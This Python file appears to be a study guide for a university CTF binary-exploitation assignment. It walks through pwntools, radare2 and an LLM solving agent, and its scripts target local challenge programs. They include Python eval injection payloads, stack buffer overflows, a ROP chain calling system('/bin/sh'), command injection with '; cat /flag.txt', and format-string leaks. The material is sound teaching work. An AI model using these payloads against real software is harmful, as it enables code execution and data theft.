#!/usr/bin/env python3

# ============================================================================
# SECTION 1: PWNTOOLS ESSENTIALS
# ============================================================================

"""
BASIC PWNTOOLS USAGE
--------------------
Pwntools is the main library for interacting with challenge programs.
"""

from pwn import *

# Set logging level (reduce noise)
context.log_level = 'error'  # Options: 'debug', 'info', 'warning', 'error'

# ---- PROCESS INTERACTION ----

# Start a Python script
p = process(['python3', 'challenge.py'])

# Start a binary
p = process('./binary')

# Start with custom environment
p = process('./binary', env={'LD_PRELOAD': '/path/to/lib.so'})

# ---- SENDING DATA ----

p.send(b'data')           # Send without newline
p.sendline(b'data')       # Send with newline (\n)
p.sendafter(b'prompt', b'response')  # Wait for prompt, then send

# ---- RECEIVING DATA ----

p.recv(100)               # Receive up to 100 bytes
p.recvline()              # Receive until newline
p.recvuntil(b'password:') # Receive until specific text
p.recvall(timeout=2)      # Receive everything (with timeout!)
p.clean()                 # Receive and discard all pending data

# ---- IMPORTANT: ALWAYS ADD TIMEOUT ----
# Without timeout, recvall() will hang forever if program doesn't close
output = p.recvall(timeout=2).decode()

# ---- CLEANUP ----
p.close()  # Always close processes to free resources

# ---- WORKING WITH ELF FILES ----

elf = ELF('./binary')
print(hex(elf.symbols['main']))      # Get function address
print(hex(elf.symbols['win']))       # Get win function address
print(hex(elf.got['puts']))          # Get GOT entry
print(hex(elf.plt['puts']))          # Get PLT entry

# ---- PACKING ADDRESSES ----

p64(0x401234)  # Pack 64-bit address (little-endian)
p32(0x401234)  # Pack 32-bit address (little-endian)
u64(b'\x34\x12\x40\x00\x00\x00\x00\x00')  # Unpack 64-bit
u32(b'\x34\x12\x40\x00')                   # Unpack 32-bit


# ============================================================================
# SECTION 2: CHALLENGE TYPE 1 - PYTHON EVAL/EXEC INJECTION
# ============================================================================

"""
VULNERABILITY: eval() / exec() / compile()
------------------------------------------
Python's eval() and exec() execute arbitrary code from user input.
If user input is passed directly, we can inject malicious code.

COMMON PATTERNS:
- eval(input("Enter password: "))
- exec(user_input)
- eval(compile(user_input, '<string>', 'eval'))
"""

# ---- EXAMPLE VULNERABLE CODE ----
"""
# challenge.py
response = eval(input("What's the password? "))
if response == "correct_password":
    print("Access granted!")
"""

# ---- EXPLOIT TECHNIQUE ----

# Goal: Read /flag.txt without knowing the password

# Method 1: Use __import__ to execute shell commands
payload = "__import__('os').popen('cat /flag.txt').read()"

# Method 2: Direct file reading
payload = "open('/flag.txt').read()"

# Method 3: Using subprocess
payload = "__import__('subprocess').check_output(['cat', '/flag.txt']).decode()"

# ---- MANUAL SOLUTION (WITHOUT AGENT) ----

def solve_eval_challenge_manual():
    """
    Solve Python eval() challenge manually
    
    Steps:
    1. Run the program to see what it does
    2. Identify eval() vulnerability by testing input
    3. Inject code to read flag
    """
    from pwn import *
    
    # Start the challenge program
    p = process(['python3', 'my_first_pwnie.py'])
    
    # Wait for the password prompt
    p.recvuntil(b'password?')
    
    # Send payload that exploits eval() to read flag
    payload = b"__import__('os').popen('cat /flag.txt').read()"
    p.sendline(payload)
    
    # Get the output (flag should be in it)
    output = p.recvall(timeout=2).decode()
    print(output)
    
    p.close()
    
    # Extract flag from output
    import re
    flag_match = re.search(r'csawctf\{[^}]+\}', output)
    if flag_match:
        print(f"FLAG: {flag_match.group(0)}")

# ---- AGENT SOLUTION ----

def solve_eval_challenge_with_agent():
    """
    How the agent solves this:
    
    1. Agent calls run_command to list files
    2. Agent sees my_first_pwnie.py but can't read it (blocked)
    3. Agent uses run_exploit to interact with the program
    4. LLM figures out it's eval() from program behavior
    5. LLM crafts injection payload
    6. Agent detects flag in output and returns it
    """
    
    # Agent would execute this exploit script:
    agent_exploit = """
from pwn import *
p = process(['python3', 'my_first_pwnie.py'])
p.recvuntil(b'password?')
p.sendline(b"__import__('os').popen('cat /flag.txt').read()")
print(p.recvall(timeout=2).decode())
p.close()
    """
    # Agent runs this and extracts flag from output

# ---- DETECTION TIPS ----
"""
How to identify eval/exec vulnerabilities:

1. Look for these keywords in error messages:
   - "eval"
   - "exec" 
   - "compile"

2. Test with simple expressions:
   Input: 1+1
   Output: 2  <-- This means eval() is being used!

3. Test with __import__:
   Input: __import__('sys').version
   Output: Python version <-- Code execution confirmed!

4. Common Python injection payloads:
   - __import__('os').system('command')
   - open('/flag.txt').read()
   - eval(compile('malicious code', '<string>', 'eval'))
"""


# ============================================================================
# SECTION 3: CHALLENGE TYPE 2 - BUFFER OVERFLOW
# ============================================================================

"""
VULNERABILITY: Buffer Overflow
-------------------------------
When a program reads more data into a buffer than it can hold,
it overwrites adjacent memory (like return addresses or other variables).

COMMON PATTERNS:
- gets() in C (no bounds checking)
- scanf("%s", buffer) without size limit
- strcpy() without bounds checking
"""

# ---- EXAMPLE VULNERABLE CODE ----
"""
// vuln.c
#include <stdio.h>

void print_flag() {
    FILE *f = fopen("/flag.txt", "r");
    char flag[100];
    fgets(flag, 100, f);
    printf("%s\n", flag);
}

int main() {
    char buffer[32];
    printf("Enter your name: ");
    gets(buffer);  // VULNERABLE! No bounds checking
    printf("Hello %s\n", buffer);
    return 0;
}
"""

# ---- EXPLOIT TECHNIQUE ----

# Goal: Overflow buffer to overwrite return address and call print_flag()

# Step 1: Find offset (how many bytes until we overwrite return address)
# Method A: Use cyclic pattern
from pwn import *

pattern = cyclic(100)  # Generate unique pattern
# Send pattern, see where it crashes
# Use cyclic_find() to find offset

# Method B: Trial and error
# Send 'A' * 32, then 'A' * 40, then 'A' * 48 until crash

# Step 2: Find target function address
elf = ELF('./binary')
win_addr = elf.symbols['print_flag']  # Get address of win function

# Step 3: Craft payload
offset = 40  # Number of bytes to fill buffer + saved registers
payload = b'A' * offset  # Fill buffer
payload += p64(win_addr)  # Overwrite return address with win function

# ---- MANUAL SOLUTION (WITHOUT AGENT) ----

def solve_buffer_overflow_manual():
    """
    Solve buffer overflow challenge manually
    
    Steps:
    1. Analyze binary with file, checksec
    2. Decompile with radare2 to find buffer size
    3. Find win/flag function
    4. Calculate offset
    5. Craft payload to overwrite return address
    """
    from pwn import *
    
    # Load binary to get function addresses
    elf = ELF('./puffin')
    
    # Find the win function (usually called print_flag, win, or similar)
    win_addr = elf.symbols['print_flag']
    
    # Start the program
    p = process('./puffin')
    
    # Receive prompt
    p.recvuntil(b'name:')
    
    # Send payload: buffer overflow + win function address
    # Offset determined by analyzing decompiled code (usually 32, 40, or 64 bytes)
    offset = 40
    payload = b'A' * offset + p64(win_addr)
    p.sendline(payload)
    
    # Get flag
    output = p.recvall(timeout=2).decode()
    print(output)
    
    p.close()

# ---- FINDING OFFSET ----

def find_buffer_offset():
    """
    Technique to find the exact offset for buffer overflow
    """
    from pwn import *
    
    # Generate cyclic pattern (each 4-byte sequence is unique)
    pattern = cyclic(200)
    
    # Start program and send pattern
    p = process('./binary')
    p.sendline(pattern)
    
    # Program crashes, look at crash address (e.g., 0x6161616c)
    crash_addr = 0x6161616c  # Example from debugger/error message
    
    # Find offset of that address in pattern
    offset = cyclic_find(crash_addr)
    print(f"Offset: {offset}")

# ---- AGENT SOLUTION ----

def solve_buffer_overflow_with_agent():
    """
    How the agent solves this:
    
    1. Agent uses decompile to analyze binary
    2. LLM sees buffer[32] and gets() with no bounds check
    3. LLM identifies print_flag() function
    4. Agent uses run_command to get function address (objdump)
    5. LLM calculates offset from decompiled code
    6. Agent creates exploit with correct offset + address
    7. Flag detected in output
    """
    pass

# ---- ANALYSIS COMMANDS ----
"""
Before exploiting, analyze the binary:

1. File type:
   $ file binary
   Output: ELF 64-bit LSB executable

2. Security features:
   $ checksec binary
   Output shows: NX, PIE, ASLR status

3. Find functions:
   $ objdump -t binary | grep flag
   Output: 0000000000401234 g F .text print_flag

4. Disassemble:
   $ objdump -d binary -M intel
   Shows assembly code

5. Decompile with radare2:
   $ r2 -q -c 'aaa; pdd @main' binary
   Shows C-like pseudocode
"""


# ============================================================================
# SECTION 4: CHALLENGE TYPE 3 - RETURN ADDRESS OVERWRITE (ROP)
# ============================================================================

"""
VULNERABILITY: Return Address Overwrite
----------------------------------------
Similar to buffer overflow but focuses on controlling program flow
by overwriting the return address to jump to specific functions.

TECHNIQUE: Return-Oriented Programming (ROP)
Chain together small code snippets (gadgets) to build exploit.
"""

# ---- EXAMPLE VULNERABLE CODE ----
"""
// target.c
#include <stdio.h>

void win() {
    system("cat /flag.txt");
}

void vuln() {
    char buffer[64];
    gets(buffer);  // VULNERABLE
}

int main() {
    vuln();
    return 0;
}
"""

# ---- EXPLOIT TECHNIQUE ----

# Goal: Overflow buffer in vuln() to jump to win() when vuln() returns

def solve_return_address_overwrite():
    """
    Steps:
    1. Find offset to return address
    2. Find address of win() function
    3. Overflow buffer with: padding + win_address
    """
    from pwn import *
    
    elf = ELF('./target_practice')
    p = process('./target_practice')
    
    # Get win function address
    win_addr = elf.symbols['win']
    
    # Calculate offset (buffer size + saved rbp)
    # 64 bytes buffer + 8 bytes saved rbp = 72 bytes
    offset = 72
    
    # Craft payload
    payload = b'A' * offset  # Fill buffer and saved rbp
    payload += p64(win_addr)  # Overwrite return address
    
    p.sendline(payload)
    
    # Get flag
    output = p.recvall(timeout=2).decode()
    print(output)
    
    p.close()

# ---- ADVANCED: ROP CHAINS ----
"""
If there's no win() function, build a ROP chain:

1. Find gadgets (small instruction sequences ending in 'ret'):
   $ ROPgadget --binary ./binary

2. Chain gadgets to call system("/bin/sh"):
   pop_rdi_ret = 0x401234  # Address of: pop rdi; ret
   bin_sh = 0x402000       # Address of "/bin/sh" string
   system_plt = 0x401000   # Address of system@plt
   
   payload = b'A' * offset
   payload += p64(pop_rdi_ret)  # Pop next value into rdi
   payload += p64(bin_sh)       # "/bin/sh" address
   payload += p64(system_plt)   # Call system()
"""


# ============================================================================
# SECTION 5: RADARE2 COMMANDS FOR BINARY ANALYSIS
# ============================================================================

"""
RADARE2 CHEATSHEET
------------------
Radare2 is a powerful reverse engineering tool for analyzing binaries.
"""

# ---- BASIC USAGE ----
"""
# Open binary in quiet mode, run analysis, decompile main
$ r2 -q -c 'aaa; pdd @main' ./binary

# Commands breakdown:
-q              # Quiet mode (less startup text)
-c 'commands'   # Run commands and exit
aaa             # Analyze All (functions, strings, xrefs)
pdd @main       # Print Decompiled code at main
pdf @main       # Print Disassembly of main

# Inside radare2 (interactive mode):
$ r2 ./binary
[0x00400000]> aaa              # Analyze
[0x00400000]> afl              # List all functions
[0x00400000]> s main           # Seek to main
[0x00400000]> pdd              # Decompile current function
[0x00400000]> pdf              # Disassemble current function
[0x00400000]> iz               # List strings in binary
[0x00400000]> q                # Quit
"""

# ---- FINDING WIN FUNCTIONS ----
"""
# Method 1: List all functions
$ r2 -q -c 'aaa; afl' ./binary | grep -i flag
$ r2 -q -c 'aaa; afl' ./binary | grep -i win

# Method 2: Search for strings
$ r2 -q -c 'iz~flag' ./binary
Output: Shows strings containing "flag"

# Method 3: Look for system/exec calls
$ r2 -q -c 'aaa; axt sym.imp.system' ./binary
Shows where system() is called from
"""

# ---- DECOMPILATION IN PYTHON ----

def decompile_with_radare2(binary_path, function='main'):
    """
    Decompile a binary function using radare2 from Python
    """
    import subprocess
    
    cmd = f"r2 -q -e scr.color=0 -c 'aaa; s {function}; pdd' {binary_path}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.stdout.strip():
        print(result.stdout)
        return result.stdout
    else:
        # Try disassembly if decompilation fails
        cmd = f"r2 -q -e scr.color=0 -c 'aaa; s {function}; pdf' {binary_path}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(result.stdout)
        return result.stdout


# ============================================================================
# SECTION 6: COMMON EXPLOITATION PATTERNS
# ============================================================================

"""
PATTERN 1: Simple Command Injection
"""
def exploit_command_injection():
    """
    Vulnerable code: os.system(user_input)
    Payload: "; cat /flag.txt"
    """
    from pwn import *
    p = process(['python3', 'vuln.py'])
    p.sendline(b"; cat /flag.txt")
    print(p.recvall(timeout=2).decode())
    p.close()

"""
PATTERN 2: Format String Vulnerability
"""
def exploit_format_string():
    """
    Vulnerable code: printf(user_input)
    Payload: %x %x %x (leak stack)
            %s (read memory)
            %n (write memory)
    """
    from pwn import *
    p = process('./vuln')
    # Leak stack values
    p.sendline(b'%p %p %p %p')
    print(p.recvall(timeout=2).decode())
    p.close()

"""
PATTERN 3: Integer Overflow
"""
def exploit_integer_overflow():
    """
    Vulnerable code:
        unsigned int size = user_input;
        char buffer[100];
        if (size < 100) {
            read(buffer, size);  // Overflow if size wraps around
        }
    
    Payload: -1 (wraps to 4294967295 on 32-bit)
    """
    from pwn import *
    p = process('./vuln')
    p.sendline(b'-1')  # Causes integer overflow
    p.sendline(b'A' * 200)
    print(p.recvall(timeout=2).decode())
    p.close()

"""
PATTERN 4: Use After Free
"""
def exploit_use_after_free():
    """
    Vulnerable code:
        char *ptr = malloc(100);
        free(ptr);
        strcpy(ptr, user_input);  // Use after free
    
    Payload: Craft input to overwrite freed memory
    """
    pass  # Advanced topic


# ============================================================================
# SECTION 7: AGENT INTERACTION GUIDE
# ============================================================================

"""
HOW THE AGENT WORKS
-------------------
Understanding the agent's decision-making process:
"""

def agent_decision_flow():
    """
    Agent's typical solving process:
    
    STEP 1: Discovery Phase
    - Action: run_command("ls -la")
    - Purpose: See what files are available
    - Output: challenge.json, binary, flag.txt
    
    STEP 2: Analysis Phase
    - For Python: run_command("file script.py")
    - For Binary: decompile("./binary", "main")
    - Purpose: Understand the challenge type
    
    STEP 3: Reconnaissance
    - For Binary: run_command("objdump -t binary | grep flag")
    - Purpose: Find interesting functions
    
    STEP 4: Exploit Development
    - Action: run_exploit(pwntools_script)
    - Purpose: Interact with program and exploit vulnerability
    
    STEP 5: Flag Extraction
    - Auto-detect flag in output
    - Action: finish(flag)
    """

"""
WHY CERTAIN DESIGN DECISIONS EXIST IN THE AGENT:
"""

# Decision 1: Why block run_command for programs?
"""
Problem: Interactive programs hang waiting for input
Solution: Force use of run_exploit with pwntools
Example:
    run_command("python3 script.py")  # HANGS!
    run_exploit("p=process(['python3','script.py'])...")  # WORKS!
"""

# Decision 2: Why block reading .py files?
"""
Problem: Assignment says "don't give LLM source code for problem 1"
Solution: Block all .py reading, force analysis by running
Benefit: Agent learns to analyze behavior, not read code
"""

# Decision 3: Why multiple flag patterns?
"""
Problem: Hidden tests might use different formats
Solution: Support csawctf{}, flag{}, CTF{}, etc.
Example:
    Challenge 1: csawctf{abc}
    Challenge 2: flag{xyz}
    Agent catches both!
"""

# Decision 4: Why add timeout to recvall()?
"""
Problem: recvall() waits forever if process doesn't close
Solution: Always use recvall(timeout=2)
Example:
    p.recvall()           # Hangs forever! ❌
    p.recvall(timeout=2)  # Returns after 2 seconds ✅
"""


# ============================================================================
# SECTION 8: TIPS
# ============================================================================

"""

Breakdown:
- 0-15 min: Read both challenges, plan approach
- 15-90 min: Run agent on both challenges
- 90-150 min: Write manual solutions with comments
- 150-180 min: Review, test, ensure flags are correct
"""

"""
DEBUGGING CHECKLIST
-------------------
If agent fails:

1. Check API key has credits
   - Test with simple API call
   
2. Check timeout issues
   - Look for "Command timed out after 60 seconds"
   - Solution: Agent is using run_command on interactive program
   
3. Check flag detection
   - Print agent output
   - Manually search for flag pattern
   - Update FLAG_PATTERNS if needed
   
4. Check LLM responses
   - Is LLM returning valid JSON?
   - Is LLM choosing correct actions?
   - Update system prompt if needed
"""

"""
MANUAL SOLUTION TEMPLATE
-------------------------
Always structure your manual solutions like this:
"""

def manual_solution_template():
    """
    Challenge: [Name]
    Type: [Python eval / Buffer overflow / etc]
    
    Vulnerability:
    - [Explain what makes it vulnerable]
    - [Show vulnerable code snippet from decompilation]
    
    Exploitation Strategy:
    - [Step-by-step plan]
    - [Why this approach works]
    
    Implementation:
    """
    from pwn import *
    
    # Step 1: [What this does]
    # [Why this is necessary]
    elf = ELF('./binary')
    
    # Step 2: [What this does]
    # [Explain the calculation]
    offset = 40
    
    # Step 3: [What this does]
    # [Explain the payload structure]
    payload = b'A' * offset + p64(elf.symbols['win'])
    
    # Step 4: [What this does]
    # [Explain the interaction]
    p = process('./binary')
    p.sendline(payload)
    
    # Step 5: [What this does]
    # [Explain why timeout is needed]
    output = p.recvall(timeout=2).decode()
    print(output)
    
    p.close()
    
    # Expected output: csawctf{...}

"""
COMMENT QUALITY EXAMPLES
------------------------
"""



# GOOD COMMENT (shows understanding):
# Execute shell command but block flag reading to force exploitation.
# Added timeout to prevent hanging on interactive programs.

# BAD COMMENT:
# Send payload to program

# GOOD COMMENT:
# Send buffer overflow payload: 40 bytes padding + win() address.
# The 40 bytes fills the buffer (32) + saved rbp (8) to reach return address.


# ============================================================================
# SECTION 9: QUICK REFERENCE - EXPLOIT SNIPPETS
# ============================================================================

"""
SNIPPET 1: Basic Python Eval Exploit
"""
basic_eval = """
from pwn import *
p = process(['python3', 'challenge.py'])
p.recvuntil(b':')
p.sendline(b"__import__('os').popen('cat /flag.txt').read()")
print(p.recvall(timeout=2).decode())
p.close()
"""

"""
SNIPPET 2: Basic Buffer Overflow
"""
basic_bof = """
from pwn import *
elf = ELF('./binary')
p = process('./binary')
offset = 40
payload = b'A' * offset + p64(elf.symbols['win'])
p.sendline(payload)
print(p.recvall(timeout=2).decode())
p.close()
"""

"""
SNIPPET 3: Finding Offset with Cyclic
"""
find_offset = """
from pwn import *
pattern = cyclic(200)
p = process('./binary')
p.sendline(pattern)
p.wait()  # Wait for crash
# Check crash logs for address like 0x6161616c
offset = cyclic_find(0x6161616c)
print(f'Offset: {offset}')
"""

"""
SNIPPET 4: Decompile Binary
"""
decompile = """
import subprocess
cmd = "r2 -q -e scr.color=0 -c 'aaa; s main; pdd' ./binary"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(result.stdout)
"""

"""
SNIPPET 5: Find Win Function
"""
find_win = """
import subprocess
# Method 1: objdump
result = subprocess.run("objdump -t ./binary | grep -i flag", 
                       shell=True, capture_output=True, text=True)
print(result.stdout)

# Method 2: radare2
result = subprocess.run("r2 -q -c 'aaa; afl~flag' ./binary",
                       shell=True, capture_output=True, text=True)
print(result.stdout)
"""


# ============================================================================
# SECTION 10: FINAL CHECKLIST
# ============================================================================

"""

Read both challenges completely first
Identify vulnerability types before coding
Start agent, monitor for errors
Write detailed comments explaining mechanisms
Test manual solutions before submitting
Double-check flags are in correct format

REMEMBER:
- NO LLM-generated code in agent (they check!)
- Comments must show YOUR understanding
- Agent outputs can guide manual solutions
- Explain WHY, not just WHAT
"""

if __name__ == "__main__":
    print("="*70)
    print("CTF PWN LOADED")
    print("="*70)
    print("\nThis file contains:")
    print("✓ Pwntools essentials")
    print("✓ Common vulnerability types and exploits")
    print("✓ Manual solving techniques")
    print("✓ Agent decision-making explanations")
    print("✓ Radare2 commands")
    print("="*70)
